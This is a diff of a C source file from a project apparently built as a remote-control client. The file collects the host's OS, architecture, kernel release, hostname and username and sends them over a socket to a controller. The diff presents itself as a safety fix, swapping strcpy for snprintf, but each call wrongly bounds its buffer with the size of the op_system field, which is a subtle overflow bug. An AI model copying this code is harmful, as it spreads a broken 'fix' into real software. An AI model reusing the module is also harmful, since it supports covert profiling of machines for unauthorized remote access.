@@ -2,7 +2,7 @@
 /*
  * This header file belongs to https://github.com/arthur-bryan/puppeteer
  *
- * Gets some PC informations like architecture, hostname and username
+ * Gets some PC information like architecture, hostname and username
  * and send it over socket
  *
  * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
@@ -13,14 +13,15 @@
 #include <sys/utsname.h>
 #include <string.h>
 #include <pwd.h>
+#include <stdio.h>
 
 #include "../include/sockets.h"
 #include "../include/footprint.h"
 
 
 /*
- * Fills the pointers to char with its respectives data about the PC
- * informations.
+ * Fills the pointers to char with its respective data about the PC
+ * information.
  *
  * Parameters:
  *      char *op_system:    to store the operating system
@@ -36,19 +37,19 @@ get_host_info(void) {
 
     user = getpwuid(getuid());
     uname(&host_info);
-    strcpy(host.op_system, host_info.sysname);
-    strcpy(host.architecture, host_info.machine);
-    strcpy(host.kernel_release, host_info.release);
+    snprintf(host.op_system, sizeof host.op_system, "%s", host_info.sysname);
+    snprintf(host.architecture, sizeof host.op_system, "%s", host_info.machine);
+    snprintf(host.release, sizeof host.op_system, "%s", host_info.release);
+    snprintf(host.username, sizeof host.op_system, "%s", user->pw_name);
     gethostname(host.hostname, sizeof host.hostname);
-    strcpy(host.username, user->pw_name);
     host.autorun_enabled = 0;
     return host;
 }
 
 /*
- * Sends the PC information over the socket after filling the host strucure
+ * Sends the PC information over the socket after filling the host structure
  * First send the length of the string to be sent, and then sends the string
- * itself. This proccess repeats for each host structure member to ensure that
+ * itself. This process repeats for each host structure member to ensure that
  * the bytes will be sent correctly.
  *
  * Parameters:
@@ -56,11 +57,23 @@ get_host_info(void) {
  */
 void
 send_host_info(int16_t socket_fd, host_t host) {
-    uint32_t op_system_len = strlen(host.op_system) + 1;
-    uint32_t arch_len = strlen(host.architecture) + 1;
-    uint32_t kernel_len = strlen(host.kernel_release) + 1;
-    uint32_t hostname_len = strlen(host.hostname) + 1;
-    uint32_t username_len = strlen(host.username) + 1;
+    uint32_t    op_system_len;
+    uint32_t    arch_len;
+    uint32_t    kernel_len;
+    uint32_t    hostname_len;
+    uint32_t    username_len;
+
+    host.op_system[sizeof host.op_system-1] = '\0';
+    host.architecture[sizeof host.architecture-1] = '\0';
+    host.release[sizeof host.release-1] = '\0';
+    host.hostname[sizeof host.hostname-1] = '\0';
+    host.username[sizeof host.username-1] = '\0';
+
+    op_system_len = strlen(host.op_system) + 1;
+    arch_len = strlen(host.architecture) + 1;
+    kernel_len = strlen(host.release) + 1;
+    hostname_len = strlen(host.hostname) + 1;
+    username_len = strlen(host.username) + 1;
 
     send(socket_fd, &op_system_len, sizeof op_system_len, 0);
     send(socket_fd, host.op_system, op_system_len, 0);
@@ -69,7 +82,7 @@ send_host_info(int16_t socket_fd, host_t host) {
     send(socket_fd, host.architecture, arch_len, 0);
 
     send(socket_fd, &kernel_len, sizeof kernel_len, 0);
-    send(socket_fd, host.kernel_release, kernel_len, 0);
+    send(socket_fd, host.release, kernel_len, 0);
 
     send(socket_fd, &hostname_len, sizeof hostname_len, 0);
     send(socket_fd, host.hostname, hostname_len, 0);
